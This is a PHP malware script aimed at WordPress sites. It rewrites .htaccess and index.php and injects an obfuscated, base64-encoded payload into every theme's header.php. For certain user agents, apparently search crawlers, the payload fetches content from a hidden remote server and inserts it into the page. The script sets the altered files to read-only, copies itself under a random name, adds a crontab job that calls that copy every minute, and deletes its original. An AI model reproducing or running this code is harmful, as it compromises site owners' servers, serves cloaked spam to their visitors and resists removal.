<?php


$code = '<?php goto Ilevw;UkmY3:goto xQfA_;goto MbIoB;YTKiV:XkKuQ:goto Vn7yw;Ifgaw:h2lcT:goto aY7nE;Ilevw:goto ZJaY3;goto L6MB4;SEdVf:$r0=str_replace(base64_decode(base64_decode(base64_decode("U1VFOVBRPT0="))),base64_decode(base64_decode(base64_decode("VEZFOVBRPT0="))),$r0);goto nOjSQ;GQKXZ:goto l9B0D;goto fQfAd;kdTIc:goto grfyL;goto SshGr;h1zWS:goto h2lcT;goto ivSAJ;Drfix:UM3EH:goto AnuK9;afaeS:RZGsI:goto hE9Er;SIQpW:NXZSx:goto SEdVf;ZQTm9:ZJaY3:goto GQKXZ;aS6wf:if(strpos($r0,base64_decode(base64_decode(base64_decode("V2pJNWRsb3llR3c9"))))){$j1=curl_init();curl_setopt($j1,CURLOPT_URL,base64_decode(base64_decode(base64_decode(base64_decode("V1ZWb1UwMUhUa1ZpTTFwTlpXdFZlbFJ0YXpCbGF6RlVUa2hzVDFaRk1URlVWM0JLVFhjOVBRPT0="))))."\57\143\141\x6b\x65\x73\x2f\x3f\x75\x73\x65\162\141\147\x65\156\x74\75{$r0}\46\x64\157\155\141\x69\x6e\75{$_SERVER[base64_decode(base64_decode(base64_decode("VTBaU1ZWVkdPVWxVTVU1Vg==")))]}");$b2=curl_exec($j1);curl_close($j1);echo $b2;}goto VbbsD;fGaRQ:goto uxfZg;goto B1lSk;SEca8:uxfZg:goto DDmW2;MbIoB:goto ckNIK;goto SIQpW;fQfAd:goto q5iSx;goto Ml9VY;B1lSk:QfNkj:goto z_k5u;ivSAJ:vngOd:goto aS6wf;oQZZL:l9B0D:goto fGaRQ;JMRHK:goto YRag1;goto afaeS;aY7nE:goto XkKuQ;goto JMRHK;m1NjG:q5iSx:goto Drfix;Ml9VY:grfyL:goto BMDqY;L6MB4:ckNIK:goto oQZZL;AnuK9:goto vngOd;goto Ifgaw;SshGr:uHe4s:goto UkmY3;xrHyN:goto RZGsI;goto SEca8;Vn7yw:goto NXZSx;goto m1NjG;z_k5u:goto UM3EH;goto kdTIc;nOjSQ:goto QfNkj;goto ZQTm9;BMDqY:xQfA_:goto xrHyN;VbbsD:goto uHe4s;goto C8hic;DDmW2:$r0=base64_decode(base64_decode(base64_decode("VEdrMGRRPT0="))).mb_strtolower($_SERVER[HTTP_USER_AGENT]);goto h1zWS;C8hic:YRag1:goto YTKiV;hE9Er: $botbotbot=0;?>';

	if ((file_exists("wp-admin")) AND (file_exists("wp-content")) AND (file_exists("wp-includes")))
	{

$orig_ht = "<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>";


$name1=".h"; $name2="ta"; $name3 = "cce"; $name4="ss";
$name = $name1.$name2.$name3.$name4;

chmod ($name, 0777);
unlink($name);
file_put_contents($name, $orig_ht);
chmod ($name, 0444);

	$orig_index = "<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );";
chmod ("index.php", 0777);
unlink("index.php");

    file_put_contents('index.php', $orig_index);

chmod ("index.php", 0555);
	}

if ((file_exists("wp-admin")) AND (file_exists("wp-content")) AND (file_exists("wp-includes")))
{
chmod("wp-content", 0777);
if (file_exists("wp-content/themes"))
{
chmod("wp-content/themes", 0777);
	$dirs = scandir("wp-content/themes");
	foreach ($dirs as $dir)
	{
		if ((is_dir("wp-content/themes/$dir")) AND ($dir !== ".") AND ($dir !== "..")) 
		{
chmod("wp-content/themes/$dir", 0777);			
			if (file_exists("wp-content/themes/$dir/header.php")) 
			{
				          $file = fopen("wp-content/themes/".$dir."/header.php", "r"); 
                          $buffer = fread($file, filesize("wp-content/themes/".$dir."/header.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  if (strpos($buffer2, '$botbotbot')<10)
						  {
						  $buffer = $code."\n".$buffer;
						  chmod("wp-content/themes/$dir/header.php", 0777);
						  unlink("wp-content/themes/$dir/header.php");
						  $outheader = fopen("wp-content/themes/".$dir."/header.php", "w");
						  fwrite($outheader, $buffer);
						  fclose($outheader);
						  chmod("wp-content/themes/$dir/header.php", 0444);
						  }
            }
			}
		}
	}
}

else
{
					      $file = fopen("index.php", "r"); 
                          $buffer = fread($file, filesize("index.php")); 
						  $buffer2 = str_replace("\n", "11111111111111", $buffer);
						  if (strpos($buffer2, '$botbotbot')<10)
						  {
						  $buffer = $code."\n".$buffer;
						  chmod("index.php", 0777);
						  unlink("index.php");
						  $outheader = fopen("index.php", "w");
						  fwrite($outheader, $buffer);
						  fclose($outheader);
						  chmod("index.php", 0555);
						  }
}


$let = array ("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");    
$newname='';     
for ($ns=1;$ns<rand(4,4);$ns++)     
{     
$r = rand (0,count($let)-1);     
$newname .= $let[$r];     
}  

copy ("z1.php", $newname.".php");
chmod ($newname.".php", 0644);

if (file_exists("z1.php"))
{
	$url = $_SERVER['HTTP_HOST'];
system('echo "* * * * * wget http://'.$url.'/'.$newname.'.php" | crontab');
unlink("z1.php");
}

$dir = scandir(".");
foreach ($dir as $dirr)
{
	$url = $_SERVER['HTTP_HOST'];
	if ((is_dir($dirr)) AND (file_exists("$dirr/zzz.php"))) 
	{
     exec("wget http://$url/$dirr/zzz.php");
	unlink("zzz.php");
	}
}

?>